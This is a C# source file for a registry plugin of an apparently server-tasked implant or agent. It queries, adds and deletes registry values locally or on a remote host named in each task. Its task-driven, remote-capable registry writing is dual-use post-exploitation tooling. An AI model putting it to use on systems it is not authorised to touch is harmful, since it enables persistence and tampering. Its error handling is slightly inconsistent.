using Workflow.Contracts;
using Workflow.Models;
using Workflow.Utilities;
using Microsoft.Win32;
using reg;
using System.Text;
using System.Text.Json;

namespace Workflow
{
    public class Plugin : IModule
    {
        public string Name => "reg";
        private IServiceConfig config { get; set; }
        private IDataBroker messageManager { get; set; }
        private ILogger logger { get; set; }
        private ICredentialProvider tokenManager { get; set; }
        public Plugin(PluginContext context)
        {
            this.messageManager = context.MessageManager;
            this.config = context.Config;
            this.logger = context.Logger;
            this.tokenManager = context.TokenManager;
        }
        public async Task Execute(ServerJob job)
        {
            DebugLog.Log($"Executing {Name} [{job.task.id}]");
            RegArgs args = JsonSerializer.Deserialize<RegArgs>(job.task.parameters);
            TaskResponse rr = new TaskResponse()
            {
                task_id = job.task.id,
            };

            RegistryKey rk;
            string response = string.Empty;
            args.keyPath = NormalizeKey(args.keyPath);
            bool writable = args.action == "add" || args.action == "delete";
            if (!TryGetRegistryKey(args.hostName, args.keyPath, writable, out rk, out response))
            {
                DebugLog.Log($"{Name} failed to get registry key '{args.keyPath}' [{job.task.id}]");
                rr.status = "error";
                rr.completed = true;
                rr.user_output = response;
                this.messageManager.AddTaskResponse(rr);
                return;
            }
            DebugLog.Log($"{Name} action={args.action} keyPath={args.keyPath} [{job.task.id}]");
            switch (args.action)
            {
                case "query":
                    if (!TryQueryRegKey(rk, args.keyPath, out response))
                    {
                        rr.status = "error";
                    }
                    rr.user_output = response;
                    rr.completed = true;
                    break;
                case "add":
                    bool err = false;
                    switch (args.keyType){
                        case "string":
                            err = TryAddRegKey(rk, args.keyName, args.keyValue, RegistryValueKind.String, out response);
                            break;
                        case "dword":
                            err = TryAddRegKey(rk, args.keyName, args.keyValue, RegistryValueKind.DWord, out response);
                            break;
                        case "qword":
                            err = TryAddRegKey(rk, args.keyName, args.keyValue, RegistryValueKind.QWord, out response);
                            break;
                        case "binary":
                            err = TryAddRegKey(rk, args.keyName, Misc.Base64DecodeToByteArray(args.keyValue), RegistryValueKind.Binary, out response);
                            break;
                        case "multi_string":
                            err = TryAddRegKey(rk, args.keyName, args.keyValue.Split(','), RegistryValueKind.MultiString, out response);
                            break;
                        case "expand_string":
                            err = TryAddRegKey(rk, args.keyName, args.keyValue, RegistryValueKind.ExpandString, out response);
                            break;
                        default:
                            err = true;
                            response = "Invalid key type selected.";
                            break;
                    }
                    if (!err)
                    {
                        rr.status = "error";
                    }
                    rr.user_output = response;
                    rr.completed = true;
                    break;
                case "delete":
                    if(!TryDeleteRegKey(rk, args.keyPath, args.keyName, out response))
                    {
                        rr.status = "error";
                    }
                    rr.user_output = response;
                    rr.completed = true;
                    break;
                default:
                    break;
            }

            messageManager.AddTaskResponse(rr);
            DebugLog.Log($"{Name} completed [{job.task.id}]");
        }
        private bool TryDeleteRegKey(RegistryKey rk, string keyPath, string keyName, out string message)
        {
            try
            {
                rk.DeleteValue(keyName, true);
                message = "Success.";
                return true;
            }
            catch (Exception e)
            {
                message = e.ToString();
                return false;
            }
        }
        private bool TryQueryRegKey(RegistryKey rk, string keyPath, out string message)
        {
            try
            {
                StringBuilder sb = new StringBuilder();
                sb.AppendFormat("Main Key: {0}", rk).AppendLine();
                foreach (var Subkey in rk.GetValueNames()) // var = type ambiguous
                {
                    if (rk.GetValueKind(Subkey).ToString().ToLower() == "binary")
                    {
                        var value = (byte[])rk.GetValue(Subkey);
                        sb.AppendFormat("{0} - {1} - {2}", Subkey, rk.GetValueKind(Subkey), PrintByteArray(value)).AppendLine();
                    }
                    else
                    {
                        sb.AppendFormat("{0} - {1} - {2}", Subkey, rk.GetValueKind(Subkey), rk.GetValue(Subkey)).AppendLine();

                    }

                }

                message = sb.ToString();
                return true;
            }
            catch (Exception e)
            {
                message = e.ToString();
                return false;
            }
        }
        private bool TryAddRegKey<T>(RegistryKey rk, string keyName, T keyValue, RegistryValueKind valueType, out string message)
        {
            try
            {
                if (string.IsNullOrEmpty(keyName))
                {
                    keyName = "";
                }
                rk.SetValue(keyName, keyValue, valueType);
                message = "Added.";
                return true;
            }
            catch (Exception e)
            {
                message = e.ToString();
                return false;
            }
        }
        private string NormalizeKey(string text)
        {
            Dictionary<string, string> dic = new Dictionary<string, string>()
            {
                {"HKEY_LOCAL_MACHINE","HKLM" },
                {"HKEY_CURRENT_USER", "HKCU" },
                {"HKEY_USERS", "HKU" },
                {"HKEY_CURRENT_CONFIG", "HKCC" },

            };

            string hive = text.Split("\\")[0];

            if (dic.ContainsKey(hive))
            {
                text = text.Replace(hive, dic[hive]);
            }

            return text;
        }
        private bool TryGetRegistryKey(string hostname, string keyPath, bool writable, out RegistryKey rk, out string err)
        {
            string[] regParts = keyPath.Split('\\');
            string hive = regParts[0].ToUpper();
            string path = string.Join('\\', regParts, 1, regParts.Length - 1);
            try
            {
                RegistryKey baseKey = hive switch
                {
                    "HKCU" => string.IsNullOrEmpty(hostname)
                        ? Registry.CurrentUser
                        : RegistryKey.OpenRemoteBaseKey(RegistryHive.CurrentUser, hostname),
                    "HKU" => string.IsNullOrEmpty(hostname)
                        ? Registry.Users
                        : RegistryKey.OpenRemoteBaseKey(RegistryHive.Users, hostname),
                    "HKCC" => string.IsNullOrEmpty(hostname)
                        ? Registry.CurrentConfig
                        : RegistryKey.OpenRemoteBaseKey(RegistryHive.CurrentConfig, hostname),
                    "HKLM" => string.IsNullOrEmpty(hostname)
                        ? Registry.LocalMachine
                        : RegistryKey.OpenRemoteBaseKey(RegistryHive.LocalMachine, hostname),
                    _ => null
                };

                if (baseKey == null)
                {
                    rk = null;
                    err = "Invalid hive selected.";
                    return false;
                }

                if (writable)
                {
                    rk = baseKey.CreateSubKey(path);
                }
                else
                {
                    rk = baseKey.OpenSubKey(path);
                }

                if (rk == null)
                {
                    err = $"Key not found: {keyPath}";
                    return false;
                }

                err = "";
                return true;
            }
            catch (Exception e)
            {
                rk = null;
                err = e.ToString();
                return false;
            }
        }
        private string PrintByteArray(byte[] Bytes)
        {
            StringBuilder sb = new StringBuilder();
            for (int i = 0; i < Bytes.Length; ++i)
            {
                sb.Append(string.Format("{0:X2}" + " ", Bytes[i]));
            }
            return sb.ToString();
        }
    }
}
